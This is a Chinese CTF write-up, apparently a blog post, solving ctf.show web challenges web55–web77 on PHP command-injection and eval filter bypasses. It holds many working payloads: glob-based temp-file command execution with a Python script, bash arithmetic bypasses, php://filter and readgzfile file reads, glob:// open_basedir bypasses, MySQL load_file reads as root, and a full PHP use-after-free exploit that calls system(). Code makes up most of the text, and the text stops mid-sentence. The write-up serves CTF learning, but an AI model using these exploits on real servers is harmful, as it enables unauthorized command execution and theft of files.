html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;POST数据包POC\u0026lt;/title\u0026gt; 7\u0026lt;/head\u0026gt; 8\u0026lt;body\u0026gt; 9\u0026lt;form action=\u0026#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 10\u0026lt;!--链接是当前打开的题目链接--\u0026gt; 11 \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名：\u0026lt;/label\u0026gt; 12 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; 13 \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; 14\u0026lt;/form\u0026gt; 15\u0026lt;/body\u0026gt; 16\u0026lt;/html\u0026gt; 在上传的文件里面写入sh指令\n1#!/bin/sh 2ls 2.抓包\n3.构造执行sh命令的poc\n详细解释poc的构造：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob\n我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc\n?c=.+/???/????????[@-[] 注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。 我们就来吧\n修改一下指令内容即可得到flag\nweb56 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} ;|[a-z]|[0-9]|\\$|(|{|'|\u0026quot;|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n这题相比上一题多过滤了一个数字，不影响我们上题的解题方法\n这里不再赘述\n放个大佬的脚本\n1import requests 2 3while True: 4\turl = \u0026#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]\u0026#34; 5\tr = requests.post(url, files={\u0026#34;file\u0026#34;: (\u0026#39;feng.txt\u0026#39;, b\u0026#39;cat flag.php\u0026#39;)}) 6\tif r.text.find(\u0026#34;flag\u0026#34;) \u0026gt; 0: 7\tprint(r.text) 8\tbreak web57 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-08 01:02:56 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13// 还能炫的动吗？ 14//flag in 36.php 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ 18 system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤条件增加\n;|[a-z]|[0-9]|`||#|'|\u0026quot;|`|%|\\x09|\\x26|\\x0a|\u0026gt;|\u0026lt;|.|,|?|*|-|=|[/\n这道题把?过滤了，但是我们可以看到\nsystem(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 这题会将我们传入的get参数进行拼接后再执行\n题目里有个暗示\n//flag in 36.php 也就是说我们要用符号构造出36\n我们可以利用linux的$(())构造出36\n在linux里面$(())=0，$((~ $(()) ))=-1\n其中~符号表示取反，这里0的取反等于－1\n也就是我们先将36个-1加起来再取反得到我们需要的36\npayload:\nc=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 从而得到flag\nweb58 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} payload:\nc=highlight_file(\u0026#34;flag.php\u0026#34;);\rc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码\rc=show_source(\u0026#39;flag.php\u0026#39;); web59 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法与上题一致，不再赘述\n（没搞懂两题有什么区别）\nweb60 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法依旧与web58一致\n可能我太菜了看不出有什么区别\nweb61 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧web58\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb63 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb64 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 嘶，怎么还是那样\u0026hellip;\nweb65 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 同上\u0026hellip;\nweb66 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 本来以为还是一样的，没想到\u0026hellip;\n看来我们要想办法查目录了\n我们可以尝试利用php中查询目录的函数\n比如 scandir()\nvar_dump(scandir(\u0026#39;/\u0026#39;)); 接下来就是查flag，可以通过文件包含来查\nflag.txt前面记得加上/\nweb67 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 这题解法与web66一致\nweb68 这题貌似只是show_source和highlight_file用不了，其他没什么变化\n可以直接用前两题的方法\n也可以直接\nc=include(\u0026#39;/flag.txt\u0026#39;) //赌 web69 这题相比上一题，print_r() 和 var_dump() 也被禁用了\n我们可以通过寻找其他可以打印数组的函数来打印目录\n我们可以通过var_export()来代替，从而打印目录\nc=var_export(scandir(\u0026#34;/\u0026#34;)); 接下读flag即可\nc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=/flag.txt 其他的解法：\n查文件\n?c=echo implode(\u0026#34;,\u0026#34;,(scandir(\u0026#39;/\u0026#39;))); ?c=echo json_encode(scandir(\u0026#34;/\u0026#34;)); 读文件\n?c=readgzfile(\u0026#39;/flag.txt\u0026#39;); web70 这题把error_reporting()和ini_set()禁用了\n虽然不知道有什么用，不影响我用上一题的方法读flag\nweb71 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ $s = ob_get_contents();：获取输出缓冲区的内容并赋值给变量s。输出缓冲区在 PHP 中用于临时存储要输出到浏览器等的内容，以便在合适的时候进行处理或修改。\nob_end_clean();：清空输出缓冲区并关闭它，这样就清除了原始的、未经处理的输出内容，以便后续进行自定义的输出处理。\necho preg_replace(\u0026quot;/[0-9]|[a-z]/i\u0026quot;,\u0026quot;?\u0026quot;,$s);：这行代码使用正则表达式对获取到的输出内容（存储在s中）进行替换操作。它会将所有的数字和字母（不区分大小写）都替换为?，然后将处理后的内容输出到浏览器等输出端。\n也就是说这道题会对回显进行处理，让我们没法得到回显\n我们可以用exit()/die()提前结束程序，从而不执行后续代码直接进行回显\nc=var_export(scandir(\u0026#34;/\u0026#34;));exit(); c=readgzfile(\u0026#39;/flag.txt\u0026#39;);exit(); web72 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ 这道题一开始还以为和上一题差不多\n先进行目录查询\nc=var_export(scandir(\u0026#34;./\u0026#34;));exit(); 注意⚠️ 这道题只有权限查询的当前目录也就是./\n而无法访问到其他目录的文件，如 / 根目录\n尝试使用 scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作被禁止了。 open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。 当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。\n原文链接：https://blog.csdn.net/Myon5/article/details/140079942\n我们可以尝试用glob协议绕过open_basedir协议\npayload:（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录 2foreach($a as $f)// 遍历每个条目 3{ 4 echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格 5} 6exit(0); // 终止脚本执行 7?\u0026gt; 或者\npayload：（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a = opendir(\u0026#34;glob:///*\u0026#34;); // 打开根目录，并将目录句柄赋值给$a 2while (($file = readdir($a)) !== false) { // 循环读取目录中的每个条目 3 echo $file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 输出每个条目的名称，并添加HTML换行标签 4}; 5exit(0); // 终止脚本执行 6?\u0026gt; 我们可以发现flag0.php\n利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：\n尝试执行ls /; cat /flag0.txt命令\n1c=?\u0026gt;\u0026lt;?php 2pwn(\u0026#34;ls /;cat /flag0.txt\u0026#34;); 3 4function pwn($cmd) { 5 global $abc, $helper, $backtrace; 6 class Vuln { 7 public $a; 8 public function __destruct() { 9 global $backtrace; 10 unset($this-\u0026gt;a); 11 $backtrace = (new Exception)-\u0026gt;getTrace(); # ;) 12 if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { # PHP \u0026gt;= 7.4 13 $backtrace = debug_backtrace(); 14 } 15 } 16 } 17 18 class Helper { 19 public $a, $b, $c, $d; 20 } 21 22 function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { 23 $address = 0; 24 for($j = $s-1; $j \u0026gt;= 0; $j--) { 25 $address \u0026lt;\u0026lt;= 8; 26 $address |= ord($str[$p+$j]); 27 } 28 return $address; 29 } 30 31 function ptr2str($ptr, $m = 8) { 32 $out = \u0026#34;\u0026#34;; 33 for ($i=0; $i \u0026lt; $m; $i++) { 34 $out .= sprintf(\u0026#39;%c\u0026#39;,$ptr \u0026amp; 0xff); 35 $ptr \u0026gt;\u0026gt;= 8; 36 } 37 return $out; 38 } 39 40 function write(\u0026amp;$str, $p, $v, $n = 8) { 41 $i = 0; 42 for($i = 0; $i \u0026lt; $n; $i++) { 43 $str[$p + $i] = sprintf(\u0026#39;%c\u0026#39;,$v \u0026amp; 0xff); 44 $v \u0026gt;\u0026gt;= 8; 45 } 46 } 47 48 function leak($addr, $p = 0, $s = 8) { 49 global $abc, $helper; 50 write($abc, 0x68, $addr + $p - 0x10); 51 $leak = strlen($helper-\u0026gt;a); 52 if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } 53 return $leak; 54 } 55 56 function parse_elf($base) { 57 $e_type = leak($base, 0x10, 2); 58 59 $e_phoff = leak($base, 0x20); 60 $e_phentsize = leak($base, 0x36, 2); 61 $e_phnum = leak($base, 0x38, 2); 62 63 for($i = 0; $i \u0026lt; $e_phnum; $i++) { 64 $header = $base + $e_phoff + $i * $e_phentsize; 65 $p_type = leak($header, 0, 4); 66 $p_flags = leak($header, 4, 4); 67 $p_vaddr = leak($header, 0x10); 68 $p_memsz = leak($header, 0x28); 69 70 if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write 71 # handle pie 72 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; 73 $data_size = $p_memsz; 74 } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec 75 $text_size = $p_memsz; 76 } 77 } 78 79 if(!$data_addr || !$text_size || !$data_size) 80 return false; 81 82 return [$data_addr, $text_size, $data_size]; 83 } 84 85 function get_basic_funcs($base, $elf) { 86 list($data_addr, $text_size, $data_size) = $elf; 87 for($i = 0; $i \u0026lt; $data_size / 8; $i++) { 88 $leak = leak($data_addr, $i * 8); 89 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 90 $deref = leak($leak); 91 # \u0026#39;constant\u0026#39; constant check 92 if($deref != 0x746e6174736e6f63) 93 continue; 94 } else continue; 95 96 $leak = leak($data_addr, ($i + 4) * 8); 97 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 98 $deref = leak($leak); 99 # \u0026#39;bin2hex\u0026#39; constant check 100 if($deref != 0x786568326e6962) 101 continue; 102 } else continue; 103 104 return $data_addr + $i * 8; 105 } 106 } 107 108 function get_binary_base($binary_leak) { 109 $base = 0; 110 $start = $binary_leak \u0026amp; 0xfffffffffffff000; 111 for($i = 0; $i \u0026lt; 0x1000; $i++) { 112 $addr = $start - 0x1000 * $i; 113 $leak = leak($addr, 0, 7); 114 if($leak == 0x10102464c457f) { # ELF header 115 return $addr; 116 } 117 } 118 } 119 120 function get_system($basic_funcs) { 121 $addr = $basic_funcs; 122 do { 123 $f_entry = leak($addr); 124 $f_name = leak($f_entry, 0, 6); 125 126 if($f_name == 0x6d6574737973) { # system 127 return leak($addr + 8); 128 } 129 $addr += 0x20; 130 } while($f_entry != 0); 131 return false; 132 } 133 134 function trigger_uaf($arg) { 135 # str_shuffle prevents opcache string interning 136 $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 137 $vuln = new Vuln(); 138 $vuln-\u0026gt;a = $arg; 139 } 140 141 if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { 142 die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); 143 } 144 145 $n_alloc = 10; # increase this value if UAF fails 146 $contiguous = []; 147 for($i = 0; $i \u0026lt; $n_alloc; $i++) 148 $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 149 150 trigger_uaf(\u0026#39;x\u0026#39;); 151 $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; 152 153 $helper = new Helper; 154 $helper-\u0026gt;b = function ($x) { }; 155 156 if(strlen($abc) == 79 || strlen($abc) == 0) { 157 die(\u0026#34;UAF failed\u0026#34;); 158 } 159 160 # leaks 161 $closure_handlers = str2ptr($abc, 0); 162 $php_heap = str2ptr($abc, 0x58); 163 $abc_addr = $php_heap - 0xc8; 164 165 # fake value 166 write($abc, 0x60, 2); 167 write($abc, 0x70, 6); 168 169 # fake reference 170 write($abc, 0x10, $abc_addr + 0x60); 171 write($abc, 0x18, 0xa); 172 173 $closure_obj = str2ptr($abc, 0x20); 174 175 $binary_leak = leak($closure_handlers, 8); 176 if(!($base = get_binary_base($binary_leak))) { 177 die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); 178 } 179 180 if(!($elf = parse_elf($base))) { 181 die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); 182 } 183 184 if(!($basic_funcs = get_basic_funcs($base, $elf))) { 185 die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); 186 } 187 188 if(!($zif_system = get_system($basic_funcs))) { 189 die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); 190 } 191 192 # fake closure object 193 $fake_obj_offset = 0xd0; 194 for($i = 0; $i \u0026lt; 0x110; $i += 8) { 195 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); 196 } 197 198 # pwn 199 write($abc, 0x20, $abc_addr + $fake_obj_offset); 200 write($abc, 0xd0 + 0x38, 1, 4); # internal func type 201 write($abc, 0xd0 + 0x68, $zif_system); # internal func handler 202 203 ($helper-\u0026gt;b)($cmd); 204 exit(); 205} 206?\u0026gt; 记得要转url\n所以什么是uaf呢？ （先挖个坑回头补）\nweb73 这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件\nc=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录\rforeach($a as $f)// 遍历每个条目\r{\recho($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格\r}\rexit(0); // 终止脚本执行\r?\u0026gt; 可以看到一个flagc.txt文件\n这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读\nvar_export(scandir(\u0026#39;/\u0026#39;));exit(); echo(implode(\u0026#39; \u0026#39;,scandir(\u0026#39;/\u0026#39;)));exit(); 读文件的话上一题的uaf方法被ban了，这题用不了\n所以我们还是用之前方法\nc=readgzfile(\u0026#39;/flagc.txt\u0026#39;);exit(); web74 这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了\n接着用glob协议的方法读到了，flag文件名叫做flagx.txt\n先用uaf的方法试试\n发现这条路被ban掉了\n最后用\nc=readgzfile(\u0026#39;/flagx.txt\u0026#39;);exit(); 成功查到了flag\nweb75 这题要用glob查文件，用var_export查不了\n接下来是读文件\n尝试了uaf和readgzfile之类的方法都失败了\n没办法看看大佬怎么做的\n我们其实可以用到mysql的load_file方法，从而读到flag\npayload:\n1c=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); 豆包解释一下\n数据库连接： $conn = mysqli_connect(\u0026quot;127.0.0.1\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;ctftraining\u0026quot;); 这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为127.0.0.1（本地主机），用户名是root，密码也是root，要连接的数据库名称是ctftraining。如果连接成功，$conn将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。 SQL 查询语句构建： $sql = \u0026quot;select load_file('/flag36.txt') as a\u0026quot;; 这里构建了一个 SQL 查询语句。load_file()是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上/flag36.txt文件的内容，并给查询结果的这一列起了一个别名a。 执行查询并获取结果： $row = mysqli_query($conn, $sql); 这行代码使用已经建立好的数据库连接$conn来执行前面构建的 SQL 查询语句$sql。如果查询执行成功，$row将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。 while($result=mysqli_fetch_array($row)){ echo $result['a']; } 这个while循环用于遍历查询结果集。mysqli_fetch_array()函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过$result['a']来获取前面查询中load_file()函数读取到的文件内容（因为在查询中给这一列起了别名a），并将其输出到屏幕上。 程序结束： exit(); 这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。 也可以\n用PDO的方法来实现同样的目的\npayload:\n1c=try {$dbh = new PDO(\u0026#39;mysql:host=localhost;dbname=ctftraining\u0026#39;, \u0026#39;root\u0026#39;, 2\u0026#39;root\u0026#39;);foreach($dbh-\u0026gt;query(\u0026#39;select load_file(\u0026#34;/flag36.txt\u0026#34;)\u0026#39;) as $row) 3{echo($row[0]).\u0026#34;|\u0026#34;; }$dbh = null;}catch (PDOException $e) {echo $e- 4\u0026gt;getMessage();exit(0);}exit(0); 数据库连接建立： $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); 这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 $dbh。它指定了数据库服务器的主机名为 localhost，要连接的数据库名称是 ctftraining，以及用于登录数据库的用户名 root 和密码 root。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 PDOException 异常。 执行查询操作： foreach($dbh-\u0026gt;query('select load_file(\u0026quot;/flag36.txt\u0026quot;)') as $row) 这里通过已建立的数据库连接对象 $dbh 执行了一个 SQL 查询语句 select load_file(\u0026quot;/flag36.txt\u0026quot;)。load_file() 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 /flag36.txt 文件的内容。 然后使用 foreach 循环来遍历查询结果集。每次循环，$row 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 load_file() 函数返回的文件内容那一列），所以可以通过 $row[0] 来获取这一列的值。 结果输出与资源释放 结果输出： echo($row[0]).\u0026quot;|\u0026quot;; 在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 $row[0]）输出到屏幕上，并在后面添加一个 | 作为分隔符。 数据库连接资源释放： $dbh = null; 当查询结果处理完毕后，这行代码将数据库连接对象 $dbh 设置为 null，这有助于释放与该连接相关的资源，确保系统资源的合理利用。 异常处理 捕获异常： catch (PDOException $e) {echo $e-\u0026gt;getMessage();exit(0);} 整个 try 代码块被放置在一个 try-catch 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 PDOException 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 catch 块捕获。 一旦捕获到异常，catch 块中的代码将会执行。这里首先通过 $e-\u0026gt;getMessage() 获取到具体的异常消息，并将其输出到屏幕上，然后使用 exit(0) 终止脚本的执行，以防止后续可能出现的错误或未定义行为。 web76 这题依旧是用glob协议查目录，得到文件名为flag36d.txt\n用上一题mysql的方法，成功查到flag\npayload:\nc=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36d.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); web77 用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件\n接下来要看看怎么查文件\n上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法\n官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。\n什么是FFI? PHP FFI（Foreign Function 